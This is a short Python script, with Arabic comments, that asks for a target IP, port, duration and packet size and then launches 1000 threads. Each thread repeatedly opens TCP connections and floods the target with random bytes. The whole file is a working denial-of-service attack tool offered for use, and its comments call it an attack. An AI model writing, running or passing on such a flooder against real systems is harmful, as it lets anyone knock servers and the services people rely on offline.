import socket
import time
import random
import threading

ip = input("IP HuMan :> ")
port = int(input("Port Aljban :> "))
duration = int(input("Time :> "))
size = int(input("Ohman :> "))
threads = 1000  # تقليل عدد الخيوط لمنع مشاكل الأداء

# حساب وقت انتهاء الهجوم مرة واحدة فقط
floodtime = time.time() + duration

def tcp(ip, port, floodtime, size):
    while time.time() < floodtime:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            try:
                sock.connect((ip, port))
                while time.time() < floodtime:
                    sock.send(random._urandom(size))
            except:
                pass

# تشغيل الهجوم بعدد الخيوط المطلوبة
for _ in range(threads):
    threading.Thread(target=tcp, args=(ip, port, floodtime, size)).start()